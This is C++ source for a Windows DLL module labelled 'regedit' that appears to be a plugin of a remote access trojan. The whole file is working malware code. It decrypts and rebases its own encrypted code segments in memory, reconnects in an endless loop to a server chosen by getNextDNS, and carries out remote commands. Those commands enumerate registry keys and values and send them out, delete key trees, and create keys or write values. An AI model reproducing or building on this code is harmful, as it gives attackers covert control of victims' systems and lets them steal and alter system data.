#include "../Core/ComponentUtilities.h"
#include "../Core/PELoader.h"
#include "../Core/TcpShortDef.h"
#include <fstream>
#include <shellapi.h>
#include <sstream>

//Components required defines
#define COMPONENT_TYPE ClientTypes::regedit

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { { 0 }, 1 };

HMODULE thisDll;
FILE_MUTEX_STRUCT thisLock;

int main();


bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH: {
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH: {
			break;
		}
		case DLL_THREAD_ATTACH: {
			break;
		}
		case DLL_THREAD_DETACH: {
			break;
		}
	}

	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	main();
#endif
}

//Error code should be 1000
//This is the signature for thread function
unsigned int WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking");
	thisLock = getComponentLock(thisDll);

	if (!thisLock.locked) {
		DBG("Intro ....FAILED");
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....Decrypting module in memory");

	if (!revertRelocatorChanges(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!decryptSegmentInMemory(thisDll, segment_crypt)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!rebaseModuleSegment(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....main() called");
	main();

	return 1;	//doesn't matter anymore. Just the first errors are important(for the loader)
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}


//Encripted side
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383


HKEY getRootKeyFromPath(std::string path) {
	std::string root_string = path.substr(0, path.find_first_of('\\'));
	if (root_string == "HKEY_CLASSES_ROOT") return HKEY_CLASSES_ROOT;
	if (root_string == "HKEY_CURRENT_USER") return HKEY_CURRENT_USER;
	if (root_string == "HKEY_LOCAL_MACHINE") return HKEY_LOCAL_MACHINE;
	if (root_string == "HKEY_USERS") return HKEY_USERS;
	if (root_string == "HKEY_CURRENT_CONFIG") return HKEY_CURRENT_CONFIG;

	return HKEY_CURRENT_USER;
}
std::string getSubkeyFromPath(std::string path) {
	size_t slash_index = path.find_first_of('\\');
	if (slash_index == std::string::npos) return "";

	return path.substr(path.find_first_of('\\') + 1);
}

bool sendRegValue(HorizonClient& client, DWORD64 valueNameSize, const char* valueName, DWORD64 valueDataSize, const char* valueData, DWORD valueType) {
	if (sendHeader(PacketDataTypes::enum_values, (4 + (DWORD64)valueNameSize) + 4 + (4 + (DWORD64)valueDataSize), "") &&
		sendData((char*)&valueNameSize, 4) &&
		sendData(valueName, valueNameSize) &&
		sendData((char*)&valueType, 4) &&
		sendData((char*)&valueDataSize, 4) &&
		sendData(valueData, valueDataSize)) {

		return true;
	}

	return false;
}

store_code(segment_crypt) bool netloop(HorizonClient& client) {
	std::unique_ptr<PACKET_HEADER> header(new PACKET_HEADER);
	bool result = true;

	if (!recvHeader(header.get())) return false;

	std::string reg_full_path = header->arguments;
	HKEY root_key = getRootKeyFromPath(reg_full_path);
	std::string subkey_path = getSubkeyFromPath(reg_full_path);
	HKEY key_handle;

	LONG lRet = RegOpenKeyExA(root_key, subkey_path.c_str(), 0, KEY_READ | KEY_QUERY_VALUE | KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE, &key_handle);
	if (lRet != ERROR_SUCCESS) return true;

	CHAR  keyName[MAX_KEY_LENGTH]; // buffer for subkey name
	DWORD keyNameSize;         // size of name string
	DWORD numberOfSubkeys = 0;     // number of subkeys
	DWORD numberOfValues = 0;       // number of values for key
	DWORD returnCode;
	PCHAR valueName = new char[MAX_VALUE_NAME];
	DWORD valueNameSize = MAX_VALUE_NAME;
	DWORD maxValueDataSize = 0;   // longest value data

	// this is a code that must be executed for both of the commands
	if ((PacketDataTypes)header->data_type == PacketDataTypes::enum_keys || (PacketDataTypes)header->data_type == PacketDataTypes::enum_values) {
		if ((returnCode = RegQueryInfoKeyA(
			key_handle,
			NULL, NULL, NULL,
			&numberOfSubkeys,   // number of subkeys
			NULL,
			NULL,
			&numberOfValues,    // number of values for this key
			NULL,
			&maxValueDataSize,
			NULL, NULL)
			) != ERROR_SUCCESS) {

			RegCloseKey(key_handle);
			return false;
		}

		// So that in case of a SZ_EXP etc. it can also hold the \0
		maxValueDataSize++;
	}

	switch ((PacketDataTypes)header->data_type) {
		case PacketDataTypes::enum_keys: {
			result = true;

			if (numberOfSubkeys) {
				if (!sendHeader(PacketDataTypes::enum_keys, (DWORD64)numberOfSubkeys * MAX_KEY_LENGTH, header->arguments)) {
					result = false;
					break;
				}

				for (DWORD i = 0; i < numberOfSubkeys; i++) {
					keyNameSize = MAX_KEY_LENGTH;

					returnCode = RegEnumKeyExA(
						key_handle,      // Handle to an open/predefined key
						i,    // Index of the subkey to retrieve.
						keyName,    // buffer that receives the name of the subkey
						&keyNameSize, // size of the buffer specified by the achKey
						NULL, NULL, NULL, NULL
					);

					if (returnCode != ERROR_SUCCESS) keyName[0] = 0;
					if (!sendData(keyName, MAX_KEY_LENGTH)) {
						result = false;
						break;
					}
				}
			}

			break;
		}
		case PacketDataTypes::enum_values: {
			PCHAR valueData = NULL;
			result = true;

			if (numberOfValues) {
				valueData = new char[maxValueDataSize + 10];	//make space for default error messages

				for (DWORD i = 0; i < numberOfValues; i++) {
					DWORD valueType;
					DWORD valueDataSize = maxValueDataSize;

					valueNameSize = MAX_VALUE_NAME;

					if ((returnCode = RegEnumValueA(
						key_handle,    // Handle to an open key
						i,    // Index of value
						valueName,    // Value name
						&valueNameSize,
						NULL,      // Reserved
						&valueType,    // Value type
						(LPBYTE)valueData, // Value data
						&valueDataSize  // sizeof data in bytes
					) != ERROR_SUCCESS)) continue;

					// If funnction worked then this holds the number of bytes of the value name
					// WITHOUT the null terminator.
					valueNameSize++;

					if (!sendRegValue(client, valueNameSize, valueName, valueDataSize, valueData, valueType)) {
						result = false;
						break;
					}
				}

				// After a series of succesfull operations have a nice ending,
				delete[] valueData;
			}

			// Send finish packet
			if (!sendRegValue(client, 0, "", 0, "", 0)) {
				result = false;
			}

			break;
		}
		case PacketDataTypes::delete_key: {
			// delete a key
			RegDeleteTreeA(root_key, reg_full_path.c_str());

			break;
		}
		case PacketDataTypes::create_key: {
			// create new key
			HKEY newKey;
			std::string newKeyPath = reg_full_path + (reg_full_path == "" ? "" : "\\") + getPacketParamValue(header->arguments, "newName");

			RegCreateKeyExA(root_key, newKeyPath.c_str(), 0, NULL, 0, KEY_CREATE_SUB_KEY, NULL, &newKey, NULL);
			RegCloseKey(newKey);

			break;
		}
		case PacketDataTypes::create_value: {
			std::string name = getPacketParamValue(header->arguments, "name");
			std::string type = getPacketParamValue(header->arguments, "type");
			std::string data = getPacketParamValue(header->arguments, "data");
			DWORD i_type = std::stoi(type);

			switch (i_type) {
				case 4: {
					// dword
					DWORD dval = std::stoul(data);

					RegSetValueExA(key_handle, name.c_str(), 0, i_type, (PBYTE)&dval, 4);
					break;
				}
				case 11: {
					// qword
					UINT64 dval = std::stoull(data);

					RegSetValueExA(key_handle, name.c_str(), 0, i_type, (PBYTE)&dval, 8);
					break;
				}
				case 3: {
					// binary

					// ? don;t know yet
					break;
				}
				default: {
					RegSetValueExA(key_handle, name.c_str(), 0, i_type, (PBYTE)data.c_str(), data.size() + 1);

					break;
				}
			}

			break;
		}
	}

	// Free allocated buffer
	delete[] valueName;

	// Close the key handle
	RegCloseKey(key_handle);

	return result;
}

void callback_userdescriptorChanged(const USERDESCRIPTOR* new_user) {
	updateStoredDescriptor(new_user);
}

store_code(segment_crypt) int main() {
	while (true) {
		try {
			DBG("Connecting");

			std::unique_ptr<USERDESCRIPTOR> user = loadStoredDescriptor(getVersion(), COMPONENT_TYPE);
			HorizonClient client(getNextDNS(), user.get(), thisDll, callback_userdescriptorChanged);

			DBG("Connected");

			if (!client.authentificate(__LINE__)) {
				DBG("Could not authentificate");
				continue;
			}

			// Message pump
			while (true) {
				if (!netloop(client)) break;
			}
			client.closeClient();

			DBG("Connection ended");

		} catch (std::exception ex) {
			DBG("Exeption");
			DBG(ex.what());
			Sleep(1000);
		}
	}

	return 0;
}